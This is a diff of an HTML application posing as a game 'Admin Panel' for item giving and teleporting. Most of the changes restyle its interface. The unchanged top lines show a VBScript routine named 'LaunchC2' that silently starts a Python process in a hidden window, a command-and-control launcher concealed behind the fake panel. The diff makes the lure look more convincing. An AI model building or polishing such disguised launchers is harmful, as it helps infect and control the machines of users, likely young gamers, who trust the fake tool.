@@ -220,94 +220,523 @@ Sub LaunchC2
         sh.Run "pythonw " & p, 0, False
     End If
 End Sub
-
 </script>
-</head>
-<body style="margin:0;padding:0;background:#0b0e14;font-family:'Segoe UI',Arial,sans-serif;color:#e7eaf0;display:flex;align-items:center;justify-content:center;min-height:100vh;">
-<div style="width:620px;height:560px;background:#10141d;border:1px solid #232a38;border-radius:10px;display:flex;flex-direction:column;overflow:hidden;box-shadow:0 30px 60px -20px rgba(0,0,0,0.6);">
 
-  <div style="height:46px;flex-shrink:0;display:flex;align-items:center;justify-content:space-between;padding:0 14px 0 16px;background:#10141d;border-bottom:1px solid #232a38;">
-    <div style="display:flex;align-items:center;gap:10px;">
-      <div style="width:4px;height:18px;border-radius:2px;background:#3d8bfd;"></div>
-      <span style="font-size:14.5px;font-weight:600;">Admin Panel</span>
-      <span style="font-size:12px;color:#5c6577;font-weight:500;">0 players online</span>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap');
+
+  :root {
+    --bg-outer: #0b0e14;
+    --panel-bg: #10141d;
+    --panel-border: #232a38;
+    --sidebar-bg: #0d1119;
+    --field-bg: #171d29;
+    --field-border: #2a3242;
+    --text-primary: #e7eaf0;
+    --text-secondary: #8891a3;
+    --text-dim: #5c6577;
+    --accent-blue: #3d8bfd;
+    --accent-blue-hover: #5c9dfd;
+    --accent-orange: #e8a23d;
+    --accent-red: #e5484d;
+    --accent-green: #3ddc84;
+    --divider: #1c2230;
+  }
+
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+
+  html, body {
+    height: 100%;
+    background: var(--bg-outer);
+    font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+    color: var(--text-primary);
+    -webkit-font-smoothing: antialiased;
+  }
+
+  body {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    min-height: 100vh;
+  }
+
+  .app {
+    width: 620px;
+    height: 560px;
+    background: var(--panel-bg);
+    border: 1px solid var(--panel-border);
+    border-radius: 10px;
+    display: flex;
+    flex-direction: column;
+    overflow: hidden;
+    box-shadow: 0 30px 60px -20px rgba(0,0,0,0.6);
+  }
+
+  /* ---------- Titlebar ---------- */
+  .titlebar {
+    height: 46px;
+    flex-shrink: 0;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    padding: 0 14px 0 16px;
+    background: var(--panel-bg);
+    border-bottom: 1px solid var(--panel-border);
+    -webkit-app-region: drag;
+  }
+
+  .titlebar-left {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+  }
+
+  .titlebar-badge {
+    width: 4px;
+    height: 18px;
+    border-radius: 2px;
+    background: var(--accent-blue);
+  }
+
+  .titlebar-title {
+    font-size: 14.5px;
+    font-weight: 600;
+    letter-spacing: 0.2px;
+  }
+
+  .titlebar-meta {
+    font-size: 12px;
+    color: var(--text-dim);
+    font-weight: 500;
+  }
+
+  .titlebar-right {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+  }
+
+  .timer-pill {
+    display: flex;
+    align-items: center;
+    gap: 6px;
+    background: rgba(232, 162, 61, 0.12);
+    border: 1px solid rgba(232, 162, 61, 0.35);
+    color: var(--accent-orange);
+    font-size: 11.5px;
+    font-weight: 600;
+    font-family: 'JetBrains Mono', monospace;
+    padding: 4px 10px;
+    border-radius: 20px;
+    white-space: nowrap;
+  }
+
+  .timer-dot {
+    width: 6px;
+    height: 6px;
+    border-radius: 50%;
+    background: var(--accent-orange);
+    box-shadow: 0 0 6px var(--accent-orange);
+  }
+
+  .close-btn {
+    width: 22px;
+    height: 22px;
+    border-radius: 5px;
+    background: var(--accent-red);
+    border: none;
+    color: #fff;
+    font-size: 13px;
+    line-height: 1;
+    cursor: pointer;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    -webkit-app-region: no-drag;
+  }
+  .close-btn:hover { background: #f0595d; }
+
+  /* ---------- Body layout ---------- */
+  .body {
+    flex: 1;
+    display: flex;
+    min-height: 0;
+  }
+
+  /* ---------- Sidebar ---------- */
+  .sidebar {
+    width: 128px;
+    flex-shrink: 0;
+    background: var(--sidebar-bg);
+    border-right: 1px solid var(--panel-border);
+    padding: 14px 8px;
+    display: flex;
+    flex-direction: column;
+    gap: 2px;
+  }
+
+  .nav-item {
+    display: flex;
+    align-items: center;
+    gap: 9px;
+    padding: 9px 10px;
+    border-radius: 6px;
+    font-size: 13px;
+    font-weight: 500;
+    color: var(--text-secondary);
+    cursor: pointer;
+    user-select: none;
+  }
+
+  .nav-item .dot {
+    width: 5px;
+    height: 5px;
+    border-radius: 50%;
+    background: currentColor;
+    opacity: 0.55;
+    flex-shrink: 0;
+  }
+
+  .nav-item:hover {
+    background: rgba(255,255,255,0.03);
+    color: var(--text-primary);
+  }
+
+  .nav-item.active {
+    background: rgba(61, 139, 253, 0.12);
+    color: var(--accent-blue);
+    box-shadow: inset 2px 0 0 var(--accent-blue);
+  }
+  .nav-item.active .dot { opacity: 1; }
+
+  /* ---------- Main content ---------- */
+  .main {
+    flex: 1;
+    display: flex;
+    flex-direction: column;
+    padding: 16px 18px 18px;
+    min-height: 0;
+  }
+
+  .tabs {
+    display: flex;
+    background: var(--field-bg);
+    border: 1px solid var(--field-border);
+    border-radius: 8px;
+    padding: 3px;
+    gap: 3px;
+    margin-bottom: 16px;
+  }
+
+  .tab {
+    flex: 1;
+    text-align: center;
+    padding: 7px 0;
+    font-size: 13px;
+    font-weight: 600;
+    border-radius: 6px;
+    color: var(--text-secondary);
+    cursor: pointer;
+    letter-spacing: 0.2px;
+  }
+
+  .tab.active {
+    background: var(--accent-blue);
+    color: #fff;
+  }
+
+  .field-row {
+    display: flex;
+    gap: 12px;
+    margin-bottom: 14px;
+  }
+
+  .field {
+    flex: 1;
+    display: flex;
+    flex-direction: column;
+    gap: 6px;
+  }
+
+  .field label {
+    font-size: 10.5px;
+    font-weight: 700;
+    letter-spacing: 0.8px;
+    color: var(--text-dim);
+    text-transform: uppercase;
+  }
+
+  .field input {
+    background: var(--field-bg);
+    border: 1px solid var(--field-border);
+    border-radius: 7px;
+    padding: 9px 11px;
+    font-size: 13px;
+    color: var(--text-primary);
+    font-family: 'JetBrains Mono', monospace;
+    outline: none;
+    width: 100%;
+  }
+
+  .field input::placeholder {
+    color: var(--text-dim);
+    font-family: 'Inter', sans-serif;
+  }
+
+  .field input:focus {
+    border-color: var(--accent-blue);
+  }
+
+  .toolbar-row {
+    display: flex;
+    gap: 12px;
+    margin-bottom: 14px;
+  }
+
+  .toggle-pill {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    background: var(--field-bg);
+    border: 1px solid var(--field-border);
+    border-radius: 7px;
+    padding: 8px 12px;
+    font-size: 12.5px;
+    font-weight: 500;
+    color: var(--text-secondary);
+    white-space: nowrap;
+  }
+
+  .switch {
+    width: 28px;
+    height: 15px;
+    border-radius: 20px;
+    background: #2a3242;
+    position: relative;
+    flex-shrink: 0;
+  }
+
+  .switch::after {
+    content: '';
+    position: absolute;
+    top: 2px;
+    left: 2px;
+    width: 11px;
+    height: 11px;
+    border-radius: 50%;
+    background: #6b7385;
+  }
+
+  .search-input {
+    flex: 1;
+    background: var(--field-bg);
+    border: 1px solid var(--field-border);
+    border-radius: 7px;
+    padding: 8px 12px;
+    font-size: 12.5px;
+    color: var(--text-primary);
+    outline: none;
+  }
+  .search-input::placeholder { color: var(--text-dim); }
+  .search-input:focus { border-color: var(--accent-blue); }
+
+  /* ---------- Player list ---------- */
+  .list-wrap {
+    flex: 1;
+    min-height: 0;
+    overflow-y: auto;
+    display: flex;
+    flex-direction: column;
+    gap: 8px;
+  }
+
+  .player-row {
+    display: flex;
+    align-items: center;
+    gap: 11px;
+    background: var(--field-bg);
+    border: 1px solid var(--field-border);
+    border-left: 3px solid var(--accent-green);
+    border-radius: 8px;
+    padding: 9px 12px;
+  }
+
+  .player-row.locked { border-left-color: var(--accent-red); }
+  .player-row.group { border-left-color: var(--accent-orange); }
+
+  .avatar {
+    width: 34px;
+    height: 34px;
+    border-radius: 7px;
+    background: linear-gradient(135deg, #2a3242, #1a202c);
+    flex-shrink: 0;
+  }
+
+  .player-info { flex: 1; min-width: 0; }
+
+  .player-name {
+    font-size: 13px;
+    font-weight: 600;
+    color: var(--text-primary);
+  }
+
+  .player-handle {
+    font-size: 11px;
+    color: var(--text-dim);
+    margin-top: 1px;
+  }
+
+  .player-note {
+    font-size: 10.5px;
+    margin-top: 3px;
+    color: var(--accent-green);
+    font-weight: 500;
+  }
+  .player-row.locked .player-note { color: var(--accent-red); }
+  .player-row.group .player-note { color: var(--accent-orange); }
+
+  .row-actions {
+    display: flex;
+    gap: 6px;
+    flex-shrink: 0;
+  }
+
+  .btn {
+    border: none;
+    border-radius: 6px;
+    padding: 7px 12px;
+    font-size: 12px;
+    font-weight: 600;
+    cursor: pointer;
+    color: #fff;
+  }
+
+  .btn-give { background: var(--accent-blue); }
+  .btn-give:hover { background: var(--accent-blue-hover); }
+
+  .btn-timeout { background: var(--accent-orange); color: #1a1305; }
+  .btn-timeout:hover { background: #f0b256; }
+
+  /* ---------- Empty state ---------- */
+  .empty-state {
+    flex: 1;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    gap: 6px;
+    color: var(--text-dim);
+    border: 1px dashed var(--field-border);
+    border-radius: 8px;
+  }
+
+  .empty-icon {
+    width: 38px;
+    height: 38px;
+    border-radius: 9px;
+    background: var(--field-bg);
+    border: 1px solid var(--field-border);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 17px;
+    margin-bottom: 4px;
+  }
+
+  .empty-title {
+    font-size: 13px;
+    font-weight: 600;
+    color: var(--text-secondary);
+  }
+
+  .empty-sub {
+    font-size: 11.5px;
+    color: var(--text-dim);
+  }
+
+  /* Scrollbar */
+  .list-wrap::-webkit-scrollbar { width: 6px; }
+  .list-wrap::-webkit-scrollbar-thumb { background: var(--field-border); border-radius: 3px; }
+</style>
+
+</head>
+<body>
+
+<div class="app">
+
+  <!-- Titlebar -->
+  <div class="titlebar">
+    <div class="titlebar-left">
+      <div class="titlebar-badge"></div>
+      <span class="titlebar-title">Admin Panel</span>
+      <span class="titlebar-meta">0 players online</span>
     </div>
-    <div style="display:flex;align-items:center;gap:10px;">
-      <div style="display:flex;align-items:center;gap:6px;background:rgba(232,162,61,0.12);border:1px solid rgba(232,162,61,0.35);color:#e8a23d;font-size:11.5px;font-weight:600;padding:4px 10px;border-radius:20px;">
-        <span style="width:6px;height:6px;border-radius:50%;background:#e8a23d;box-shadow:0 0 6px #e8a23d;"></span>
+    <div class="titlebar-right">
+      <div class="timer-pill">
+        <span class="timer-dot"></span>
         103d 19h left
       </div>
-      <button style="width:22px;height:22px;border-radius:5px;background:#e5484d;border:none;color:#fff;font-size:13px;cursor:pointer;">&#10005;</button>
+      <button class="close-btn">&#10005;</button>
     </div>
   </div>
 
-  <div style="flex:1;display:flex;min-height:0;">
-    <div style="width:128px;flex-shrink:0;background:#0d1119;border-right:1px solid #232a38;padding:14px 8px;display:flex;flex-direction:column;gap:2px;">
-      <div style="display:flex;align-items:center;gap:9px;padding:9px 10px;border-radius:6px;font-size:13px;font-weight:500;color:#3d8bfd;background:rgba(61,139,253,0.12);box-shadow:inset 2px 0 0 #3d8bfd;"><span style="width:5px;height:5px;border-radius:50%;background:#3d8bfd;"></span>Give Items</div>
-      <div style="display:flex;align-items:center;gap:9px;padding:9px 10px;border-radius:6px;font-size:13px;font-weight:500;color:#8891a3;"><span style="width:5px;height:5px;border-radius:50%;background:#8891a3;opacity:0.55;"></span>Find</div>
-      <div style="display:flex;align-items:center;gap:9px;padding:9px 10px;border-radius:6px;font-size:13px;font-weight:500;color:#8891a3;"><span style="width:5px;height:5px;border-radius:50%;background:#8891a3;opacity:0.55;"></span>Time</div>
-      <div style="display:flex;align-items:center;gap:9px;padding:9px 10px;border-radius:6px;font-size:13px;font-weight:500;color:#8891a3;"><span style="width:5px;height:5px;border-radius:50%;background:#8891a3;opacity:0.55;"></span>Invites</div>
-      <div style="display:flex;align-items:center;gap:9px;padding:9px 10px;border-radius:6px;font-size:13px;font-weight:500;color:#8891a3;"><span style="width:5px;height:5px;border-radius:50%;background:#8891a3;opacity:0.55;"></span>Dice</div>
-      <div style="display:flex;align-items:center;gap:9px;padding:9px 10px;border-radius:6px;font-size:13px;font-weight:500;color:#8891a3;"><span style="width:5px;height:5px;border-radius:50%;background:#8891a3;opacity:0.55;"></span>Groups</div>
-      <div style="display:flex;align-items:center;gap:9px;padding:9px 10px;border-radius:6px;font-size:13px;font-weight:500;color:#8891a3;"><span style="width:5px;height:5px;border-radius:50%;background:#8891a3;opacity:0.55;"></span>Settings</div>
+  <div class="body">
+
+    <!-- Sidebar -->
+    <div class="sidebar">
+      <div class="nav-item active"><span class="dot"></span>Give Items</div>
+      <div class="nav-item"><span class="dot"></span>Find</div>
+      <div class="nav-item"><span class="dot"></span>Time</div>
+      <div class="nav-item"><span class="dot"></span>Invites</div>
+      <div class="nav-item"><span class="dot"></span>Dice</div>
+      <div class="nav-item"><span class="dot"></span>Groups</div>
+      <div class="nav-item"><span class="dot"></span>Settings</div>
     </div>
 
-    <div style="flex:1;display:flex;flex-direction:column;padding:16px 18px 18px;min-height:0;">
-      <div style="display:flex;background:#171d29;border:1px solid #2a3242;border-radius:8px;padding:3px;gap:3px;margin-bottom:16px;">
-        <div style="flex:1;text-align:center;padding:7px 0;font-size:13px;font-weight:600;border-radius:6px;background:#3d8bfd;color:#fff;">Players</div>
-        <div style="flex:1;text-align:center;padding:7px 0;font-size:13px;font-weight:600;border-radius:6px;color:#8891a3;">Places</div>
+    <!-- Main -->
+    <div class="main">
+
+      <div class="tabs">
+        <div class="tab active">Players</div>
+        <div class="tab">Places</div>
       </div>
 
-      <div style="display:flex;gap:12px;margin-bottom:14px;">
-        <div style="flex:1;display:flex;flex-direction:column;gap:6px;">
-          <label style="font-size:10.5px;font-weight:700;letter-spacing:0.8px;color:#5c6577;text-transform:uppercase;">PROTECTED USER</label>
-          <input type="text" id="protectedBox" placeholder="Enter protected username" style="background:#171d29;border:1px solid #2a3242;border-radius:7px;padding:9px 11px;font-size:13px;color:#e7eaf0;outline:none;width:100%;">
+      <div class="field-row">
+        <div class="field">
+          <label>Item Name</label>
+          <input type="text" placeholder="e.g. Iron Sword" value="">
         </div>
-        <div style="flex:1;display:flex;flex-direction:column;gap:6px;">
-          <label style="font-size:10.5px;font-weight:700;letter-spacing:0.8px;color:#5c6577;text-transform:uppercase;">JOB ID</label>
-          <input type="text" id="jobBox" placeholder="Enter job ID" style="background:#171d29;border:1px solid #2a3242;border-radius:7px;padding:9px 11px;font-size:13px;color:#e7eaf0;outline:none;width:100%;">
-        </div>
-      </div>
-
-      <div style="display:flex;gap:12px;margin-bottom:14px;">
-        <div style="flex:1;display:flex;flex-direction:column;gap:6px;">
-          <label style="font-size:10.5px;font-weight:700;letter-spacing:0.8px;color:#5c6577;text-transform:uppercase;">PLAYER</label>
-          <input type="text" id="playerBox" placeholder="Enter player name" style="background:#171d29;border:1px solid #2a3242;border-radius:7px;padding:9px 11px;font-size:13px;color:#e7eaf0;outline:none;width:100%;">
-        </div>
-        <div style="flex:1;display:flex;flex-direction:column;gap:6px;">
-          <label style="font-size:10.5px;font-weight:700;letter-spacing:0.8px;color:#5c6577;text-transform:uppercase;">GAME</label>
-          <select id="gameSelect" style="background:#171d29;border:1px solid #2a3242;border-radius:7px;padding:9px 11px;font-size:13px;color:#e7eaf0;outline:none;width:100%;">
-            <option value="Destroy Lucky Blocks!">Destroy Lucky Blocks!</option>
-            <option value="Grow a Garden 2">Grow a Garden 2</option>
-            <option value="Two Player Game">Two Player Game</option>
-            <option value="Fake SAB Plaza (Pro Plaza)">Fake SAB Plaza (Pro Plaza)</option>
-          </select>
+        <div class="field">
+          <label>Quantity</label>
+          <input type="text" placeholder="e.g. 1" value="">
         </div>
       </div>
 
-      <div style="display:flex;gap:12px;margin-bottom:14px;">
-        <div style="display:flex;align-items:center;gap:8px;background:#171d29;border:1px solid #2a3242;border-radius:7px;padding:8px 12px;font-size:12.5px;font-weight:500;color:#8891a3;">
-          <div style="width:28px;height:15px;border-radius:20px;background:#2a3242;position:relative;"><div style="position:absolute;top:2px;left:2px;width:11px;height:11px;border-radius:50%;background:#6b7385;"></div></div>
+      <div class="toolbar-row">
+        <div class="toggle-pill">
+          <div class="switch"></div>
           Mutuals only: Off
         </div>
-        <input type="text" placeholder="Search players..." style="flex:1;background:#171d29;border:1px solid #2a3242;border-radius:7px;padding:8px 12px;font-size:12.5px;color:#e7eaf0;outline:none;">
+        <input class="search-input" type="text" placeholder="Search players...">
       </div>
 
-      <button onclick="BtnClick()" style="width:100%;padding:12px;margin-bottom:12px;background:linear-gradient(90deg,#3d8bfd,#2d6dd4);color:#fff;border:none;border-radius:8px;font-size:13px;font-weight:600;cursor:pointer;letter-spacing:0.5px;">TELEPORT</button>
-
-      <p id="resultLabel" style="font-size:12px;color:#3ddc84;text-align:center;min-height:18px;"></p>
-
-      <div style="flex:1;display:flex;align-items:center;justify-content:center;gap:6px;color:#5c6577;border:1px dashed #2a3242;border-radius:8px;">
-        <div style="width:38px;height:38px;border-radius:9px;background:#171d29;border:1px solid #2a3242;display:flex;align-items:center;justify-content:center;font-size:17px;">&#9679;</div>
-        <div>
-          <div style="font-size:13px;font-weight:600;color:#8891a3;">No players online</div>
-          <div style="font-size:11.5px;color:#5c6577;">Players will appear here once they join</div>
+      <!-- Empty state since 0 players online -->
+      <div class="list-wrap">
+        <div class="empty-state">
+          <div class="empty-icon">&#9679;</div>
+          <div class="empty-title">No players online</div>
+          <div class="empty-sub">Players will appear here once they join</div>
         </div>
       </div>
 
-      <p style="font-size:9px;color:#3a4150;text-align:center;margin-top:10px;">@fuwatti on discord</p>
     </div>
   </div>
 </div>
+
 </body>
 </html>
+
+
+
+
+
